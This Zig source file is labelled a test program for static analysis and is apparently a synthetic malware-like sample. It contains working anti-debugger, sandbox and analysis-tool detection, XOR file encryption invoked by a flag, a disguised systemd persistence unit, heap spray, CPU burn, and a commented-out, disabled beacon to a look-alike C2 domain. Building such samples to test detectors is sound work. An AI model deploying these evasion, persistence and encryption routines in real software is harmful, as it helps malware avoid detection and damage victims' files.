// Zig test program with security-relevant features for static analysis
const std = @import("std");
const builtin = @import("builtin");
const os = std.os;
const crypto = std.crypto;
const mem = std.mem;
const net = std.net;
const process = std.process;

// Suspicious constants
const C2_DOMAIN = "msftupdater.com";
const C2_PORT: u16 = 443;
const CRYPTO_KEY = [_]u8{ 0x2a, 0x3f, 0x5c, 0x78, 0x90, 0xab, 0xcd, 0xef };

// Error types for our operations
const MalwareError = error{
    DebuggerDetected,
    SandboxDetected,
    AnalysisDetected,
    NetworkError,
    CryptoError,
};

// Anti-debugging checks
fn checkDebugger() !void {
    if (builtin.os.tag == .linux) {
        // Check /proc/self/status for TracerPid
        const file = try std.fs.openFileAbsolute("/proc/self/status", .{});
        defer file.close();
        
        var buf: [4096]u8 = undefined;
        const size = try file.read(&buf);
        const content = buf[0..size];
        
        if (mem.indexOf(u8, content, "TracerPid:\t0") == null) {
            return MalwareError.DebuggerDetected;
        }
    }
    
    // Timing-based anti-debug
    const start = std.time.milliTimestamp();
    var sum: u64 = 0;
    var i: u32 = 0;
    while (i < 1000000) : (i += 1) {
        sum += i;
    }
    const elapsed = std.time.milliTimestamp() - start;
    
    if (elapsed > 100) {
        return MalwareError.DebuggerDetected;
    }
}

// VM/Sandbox detection
fn detectVirtualization() !void {
    var hostname_buf: [64]u8 = undefined;
    _ = try os.gethostname(&hostname_buf);
    const host_str = mem.sliceTo(&hostname_buf, 0);
    
    const vm_indicators = [_][]const u8{
        "virtualbox",
        "vmware",
        "qemu",
        "xen",
        "parallels",
        "sandbox",
    };
    
    for (vm_indicators) |indicator| {
        if (std.ascii.indexOfIgnoreCase(host_str, indicator) != null) {
            return MalwareError.SandboxDetected;
        }
    }
    
    // Check CPU count (VMs often have fewer)
    const cpu_count = try std.Thread.getCpuCount();
    if (cpu_count < 2) {
        return MalwareError.SandboxDetected;
    }
}

// Network communication
fn phoneHome(_: mem.Allocator) !void {
    // Would normally resolve and connect but simulating for analysis
    _ = C2_DOMAIN;
    _ = C2_PORT;
    return; // Simulated for static analysis
    
    // Original code would be:
    // const address = try net.Address.resolveIp(C2_DOMAIN, C2_PORT);
    // const stream = try net.tcpConnectToAddress(address);
    // defer stream.close();
    // const beacon = "GET /beacon HTTP/1.1\r\nHost: " ++ C2_DOMAIN ++ "\r\nUser-Agent: ZigMalware/1.0\r\n\r\n";
    // _ = try stream.write(beacon);
    // var response_buf: [1024]u8 = undefined;
    // _ = try stream.read(&response_buf);
}

// Encryption/obfuscation
fn xorEncrypt(data: []u8, key: []const u8) void {
    for (data, 0..) |*byte, i| {
        byte.* ^= key[i % key.len];
    }
}

// String obfuscation
fn deobfuscateString(comptime encrypted: []const u8) [encrypted.len]u8 {
    var result: [encrypted.len]u8 = undefined;
    for (encrypted, 0..) |byte, i| {
        result[i] = byte ^ CRYPTO_KEY[i % CRYPTO_KEY.len];
    }
    return result;
}

// Process manipulation
const ProcessInfo = struct {
    pid: os.pid_t,
    name: []const u8,
};

fn enumProcesses(alloc: mem.Allocator) ![]ProcessInfo {
    var processes = std.ArrayList(ProcessInfo).init(alloc);
    defer processes.deinit();
    
    if (builtin.os.tag == .linux) {
        var dir = try std.fs.openIterableDirAbsolute("/proc", .{});
        defer dir.close();
        
        var it = dir.iterate();
        while (try it.next()) |entry| {
            const pid = std.fmt.parseInt(os.pid_t, entry.name, 10) catch continue;
            
            const cmdline_path = try std.fmt.allocPrint(alloc, "/proc/{}/cmdline", .{pid});
            defer alloc.free(cmdline_path);
            
            const cmdline_file = std.fs.openFileAbsolute(cmdline_path, .{}) catch continue;
            defer cmdline_file.close();
            
            var cmd_buf: [256]u8 = undefined;
            const cmd_size = cmdline_file.read(&cmd_buf) catch continue;
            
            try processes.append(.{
                .pid = pid,
                .name = cmd_buf[0..cmd_size],
            });
        }
    }
    
    return processes.toOwnedSlice();
}

// File operations with potential for ransomware-like behavior
fn encryptFile(path: []const u8, key: []const u8) !void {
    const file = try std.fs.cwd().openFile(path, .{ .mode = .read_write });
    defer file.close();
    
    const file_size = try file.getEndPos();
    const contents = try allocator.alloc(u8, file_size);
    defer allocator.free(contents);
    
    _ = try file.read(contents);
    xorEncrypt(contents, key);
    
    try file.seekTo(0);
    try file.writeAll(contents);
}

// Persistence mechanism
fn installPersistence(exe_path: []const u8) !void {
    if (builtin.os.tag == .linux) {
        // Create systemd service
        const service_content = 
            \\[Unit]
            \\Description=System Update Service
            \\After=network.target
            \\
            \\[Service]
            \\Type=simple
            \\ExecStart={s}
            \\Restart=always
            \\
            \\[Install]
            \\WantedBy=multi-user.target
        ;
        
        const service_file = try std.fmt.allocPrint(allocator, service_content, .{exe_path});
        defer allocator.free(service_file);
        
        const service_path = "/tmp/updater.service";
        const file = try std.fs.createFileAbsolute(service_path, .{});
        defer file.close();
        try file.writeAll(service_file);
    }
}

// Memory manipulation
fn memoryTricks() !void {
    // Allocate and leak memory
    const leaked = try allocator.alloc(u8, 1024 * 1024); // 1MB
    @memset(leaked, 0xFF);
    // Intentionally not freeing
    
    // Stack spray
    var stack_spray: [8192]u8 = undefined;
    for (&stack_spray) |*byte| {
        byte.* = 0x90; // NOP
    }
    
    // Heap spray
    var heap_sprays: [10]*[1024]u8 = undefined;
    for (&heap_sprays) |*spray| {
        spray.* = try allocator.create([1024]u8);
        @memset(spray.*, 0x41);
    }
}

// Resource exhaustion
fn cpuBurn() void {
    const cpu_count = std.Thread.getCpuCount() catch 1;
    var threads: []std.Thread = allocator.alloc(std.Thread, cpu_count) catch return;
    defer allocator.free(threads);
    
    for (threads) |*thread| {
        thread.* = std.Thread.spawn(.{}, burnCore, .{}) catch continue;
    }
    
    for (threads) |thread| {
        thread.join();
    }
}

fn burnCore() void {
    var sum: f64 = 0;
    var i: u64 = 0;
    while (i < 100_000_000) : (i += 1) {
        sum += @sin(@as(f64, @floatFromInt(i))) * @cos(@as(f64, @floatFromInt(i)));
    }
}

// Hidden payload
const hidden_payload = deobfuscateString(&[_]u8{ 0x62, 0x4e, 0x36, 0x1b, 0xe0, 0xda, 0xbd, 0x9a });

// Global allocator
var gpa = std.heap.GeneralPurposeAllocator(.{}){};
const allocator = gpa.allocator();

pub fn main() !void {
    defer _ = gpa.deinit();
    
    const stdout = std.io.getStdOut().writer();
    try stdout.print("Zig Test Binary for Analysis\n", .{});
    
    // Anti-analysis checks
    checkDebugger() catch |err| {
        try stdout.print("Debugger detected: {}\n", .{err});
        return;
    };
    
    detectVirtualization() catch |err| {
        try stdout.print("Virtualization detected: {}\n", .{err});
        return;
    };
    
    // System information gathering
    const uname = os.uname();
    try stdout.print("System: {s} {s}\n", .{ uname.sysname, uname.machine });
    
    // Environment check
    if (process.getEnvVarOwned(allocator, "SANDBOX") catch null) |_| {
        try stdout.print("Sandbox environment variable detected!\n", .{});
        return;
    }
    
    // Process enumeration
    const processes = try enumProcesses(allocator);
    defer allocator.free(processes);
    try stdout.print("Found {} processes\n", .{processes.len});
    
    // Check for analysis tools
    const analysis_tools = [_][]const u8{
        "wireshark",
        "tcpdump",
        "ida",
        "gdb",
        "x64dbg",
        "ollydbg",
    };
    
    for (processes) |proc| {
        for (analysis_tools) |tool| {
            if (std.ascii.indexOfIgnoreCase(proc.name, tool) != null) {
                try stdout.print("Analysis tool detected: {s}\n", .{tool});
                return;
            }
        }
    }
    
    // Network communication attempt
    phoneHome(allocator) catch |err| {
        try stdout.print("Network error: {}\n", .{err});
    };
    
    // Decrypt hidden payload
    try stdout.print("Hidden: {s}\n", .{&hidden_payload});
    
    // Memory manipulation
    try memoryTricks();
    
    // Command execution
    const args = try process.argsAlloc(allocator);
    defer process.argsFree(allocator, args);
    
    if (args.len > 1) {
        if (mem.eql(u8, args[1], "--burn")) {
            cpuBurn();
        } else if (mem.eql(u8, args[1], "--persist")) {
            try installPersistence(args[0]);
        } else if (mem.eql(u8, args[1], "--encrypt") and args.len > 2) {
            try encryptFile(args[2], &CRYPTO_KEY);
        }
    }
    
    // Create some operations
    try asyncOperation();
    
    try stdout.print("Program completed\n", .{});
}

fn asyncOperation() !void {
    // Simulate work
    std.time.sleep(100 * std.time.ns_per_ms);
}